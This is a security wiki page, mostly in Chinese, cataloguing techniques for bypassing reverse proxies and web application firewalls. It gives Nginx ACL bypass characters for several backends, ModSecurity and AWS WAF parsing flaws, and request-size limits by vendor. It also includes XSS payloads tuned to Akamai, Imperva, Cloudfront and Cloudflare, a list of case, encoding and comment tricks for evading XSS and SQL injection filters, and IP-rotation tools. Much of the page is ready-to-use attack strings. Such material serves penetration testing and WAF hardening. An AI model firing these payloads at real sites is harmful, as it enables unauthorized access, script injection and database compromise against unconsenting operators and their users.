# 代理 / WAF 防护绕过

{{#include ../banners/hacktricks-training.md}}


## 通过路径名操控绕过 Nginx ACL 规则 <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

技巧 [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx 规则示例：
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
为了防止绕过，Nginx 在检查之前会对路径进行规范化。然而，如果后端服务器执行不同的规范化（移除 nginx 不会移除的字符），则可能绕过此防护。

### **NodeJS - Express**

| Nginx 版本 | **Node.js 绕过字符** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx 版本 | **Flask 绕过字符**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx 版本 | **Spring Boot 绕过字符** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Nginx FPM 配置:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx 被配置为阻止访问 `/admin.php`，但可以通过访问 `/admin.php/index.php` 来绕过此限制。

### 如何防止
```plaintext
location ~* ^/admin {
deny all;
}
```
## 绕过 Mod Security 规则 <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### 路径混淆

[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) 解释到 ModSecurity v3 (直到 3.0.12) **不正确地实现了 `REQUEST_FILENAME`** 变量，该变量本应包含被访问的路径（直到参数开始）。这是因为它对 URL 执行了解码以获取路径。\
因此，像 `http://example.com/foo%3f';alert(1);foo=` 这样的请求在 mod security 中会认为路径只是 `/foo`，因为 `%3f` 被转换为 `?` 导致 URL 路径结束，但实际上服务器收到的路径会是 `/foo%3f';alert(1);foo=`。

变量 `REQUEST_BASENAME` 和 `PATH_INFO` 也受到此 bug 的影响。

在 Mod Security 的第 2 版中发生了类似情况，允许通过将点用 `%2e` URL 编码发送来绕过阻止用户访问具有特定备份相关扩展名（例如 `.bak`）的文件的保护，例如：`https://example.com/backup%2ebak`。

## 绕过 AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### 畸形 Header

[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) 提到，可以通过发送一个 AWS 无法正确解析但后端服务器可以解析的“malformed” header 来绕过应用于 HTTP headers 的 AWS WAF 规则。

例如，发送下面这个在 header X-Query 中包含 SQL 注入 的请求：
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
It was possible to bypass AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed).

## Generic WAF bypasses

### Request Size Limits

Commonly WAFs have a certain length limit of requests to check and if a POST/PUT/PATCH request is over it, the WAF won't check the request.

- For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maximum size of a web request body that can be inspected for Application Load Balancer and AWS AppSync protections</td><td>8 KB</td></tr><tr><td>Maximum size of a web request body that can be inspected for CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access protections**</td><td>64 KB</td></tr></tbody></table>

- From [**Azure docs**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

旧版 Web Application Firewalls（Core Rule Set 3.1 或更低）通过关闭请求体检查允许超过 **128 KB** 的消息，但这些消息不会被检查是否存在漏洞。对于更新的版本（Core Rule Set 3.2 或更高），可以通过禁用最大请求体限制达到相同效果。当请求超过大小限制时：

If p**revention mode**: 记录并阻止该请求。\
If **detection mode**: 检查到限制为止，忽略其余部分，并在 `Content-Length` 超过限制时记录。

- From [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

默认情况下，WAF 只检查请求的前 8KB。通过添加 Advanced Metadata 可以将限制提高到 128KB。

- From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

最高 128KB。

### Static assets inspection gaps (.js GETs)

Some CDN/WAF stacks apply weak or no content inspection to GET requests for static assets (for example paths ending with `.js`), while still applying global rules like rate limiting and IP reputation. Combined with auto-caching of static extensions, this can be abused to deliver or seed malicious variants that affect subsequent HTML responses.

Practical use cases:

- 在对以 `.js` 结尾的路径发起 GET 请求时，将 payload 放入不受信任的 header（例如 `User-Agent`）以规避内容检测，然后立即请求主 HTML 来影响缓存的变体。
- 使用全新的/干净的 IP；一旦 IP 被标记，路由变化可能使该技术不可靠。
- 在 Burp Repeater 中，使用 "Send group in parallel"（single-packet style）来竞速发送两次请求（先 `.js`，再 HTML），使其经过相同的前端路径。

This pairs well with header-reflection cache poisoning. See:

{{#ref}}
cache-deception/README.md
{{#endref}}

- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)

### 混淆 <a href="#ip-rotation" id="ip-rotation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode 兼容性 <a href="#unicode-compatability" id="unicode-compatability"></a>

这取决于 Unicode 归一化的实现（更多信息见 [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)），某些共享 Unicode 兼容性的字符可能能够绕过 WAF 并按预期执行有效载荷。兼容字符可在 [here](https://www.compart.com/en/unicode) 找到。

#### 示例 <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```
### 使用编码绕过具有上下文的 WAF <a href="#ip-rotation" id="ip-rotation"></a>

正如 [**this blog post**](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization) 中提到的，为了绕过能够维护用户输入上下文的 WAF，我们可以滥用 WAF 的处理方式来对用户输入进行规范化。

例如，文章中提到 **Akamai 对用户输入进行了 10 次 URL 解码**。因此像 `<input/%2525252525252525253e/onfocus` 这样的输入会被 Akamai 视为 `<input/>/onfocus`，这可能会被认为标签已闭合。然而，只要应用程序不会对输入进行 10 次 URL 解码，受害者会看到类似 `<input/%25252525252525253e/onfocus` 的内容，这对于 XSS 攻击仍然有效。

因此，这允许将有效载荷隐藏在编码的组件中，WAF 会对其解码并解释，而受害者不会看到解码后的内容。

此外，这不仅可以用于 URL 编码的载荷，也可以用于其他编码，例如 unicode、hex、octal 等等。

在文章中建议的最终绕过示例包括：

- Akamai:`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva:`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront:`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare:`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

文章中还提到，取决于某些 WAF 如何理解用户输入的上下文，可能存在滥用的空间。文章给出的示例是 Akamai 允许在 `/*` 和 `*/` 之间放置任意内容（可能因为这通常被用作注释）。因此，像 `/*'or sleep(5)-- -*/` 这样的 SQLinjection 可能不会被拦截，并且会被视为有效，因为 `/*` 是注入的起始字符串，而 `*/` 被当作注释。

这类上下文问题也可以被用来滥用与 WAF 预期防护不同的其他漏洞（例如，这也可以用于利用 XSS）。

### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>


{{#ref}}
h2c-smuggling.md
{{#endref}}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

- [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): 生成一个可与 ffuf 一起使用的 API gateway URL
- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): 与 fireprox 类似
- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): 一个使用 API gateway IPs 的 Burp Suite 插件
- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): 根据输入文件大小和分割因子动态确定要激活的容器实例数量，并将输入拆分成块以并行执行，例如对一个 10,000 行的输入文件使用分割因子 100 行，启动 100 个实例并行处理 100 个块。
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)

### Regex Bypasses

可以使用不同的技术来绕过防火墙上的正则过滤器。示例包括交替大小写、添加换行以及对载荷进行编码。各种绕过方法的资源可以在 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) 和 [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) 找到。下面的示例摘自 [this article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)。
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## 工具

- [**nowafpls**](https://github.com/assetnote/nowafpls): 用于向 requests 添加垃圾数据以按长度绕过 WAFs 的 Burp 插件

## 参考资料

- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [https://www.youtube.com/watch?v=0OMmWtU2Y_g](https://www.youtube.com/watch?v=0OMmWtU2Y_g)
- [https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)


{{#include ../banners/hacktricks-training.md}}
